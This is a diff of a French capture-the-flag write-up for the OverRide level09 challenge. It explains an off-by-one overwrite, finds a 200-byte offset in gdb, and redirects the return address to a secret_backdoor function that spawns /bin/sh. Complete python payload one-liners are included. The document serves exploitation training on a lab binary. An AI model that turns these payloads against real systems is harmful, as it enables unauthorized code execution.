@@ -31,9 +31,8 @@ level09@OverRide:~$ python -c 'print "a"*40 + "\xff"' | ./level09
 Segmentation fault (core dumped)
 ```
 
-maintenant qu'on sait que le programme crash on peut essayer de remplacer le return address par l'adresse de la fonction secret_backdoor
-on va premierement chercher l'offset avant de trouver un pointeur vers le return address
-
+maintenant qu'on sait que le programme crash on va chercher a remplacer l'adresse de retour de la fonction par l'adresse de la fonction secret_backdoor
+on va premierement chercher l'offset pour nous permettre ensuite de indiquer l´adresse de back_door
 ```shell
 (gdb) r
 Starting program: /home/users/level09/level09 
@@ -52,7 +51,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x7fffffffe5d8:  "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah"
 
 ```
-le 6 du 6Ag est le 200eme caractere donc l'offset est de 200
+le 6 du 6Ag est le 200eme caractere donc l'offset est de 200. 
 
 maintenant qu'on a l'offset on peut essayer de remplacer le return address par l'adresse de la fonction secret_backdoor
 
@@ -76,7 +75,7 @@ donc si on le fait en une seule commande on a :
 
 1er argument : username (override sur le 41eme char) ``python -c 'print "a"*40 + "\xff"'``
 2eme argument : l'offset et l'adresse de la fonction secret_backdoor en little indian ``python -c 'print "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'``
-3eme argument : /bin/sh ``python -c 'print "/bin/sh"'``
+3eme argument : /bin/sh ``python -c 'print "/bin/sh"'`` qui va etre execute par le secret backdoor
 
 on assemble le tout : ``python -c 'print "a"*40 + "\xff" + "\n" + "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'``
 
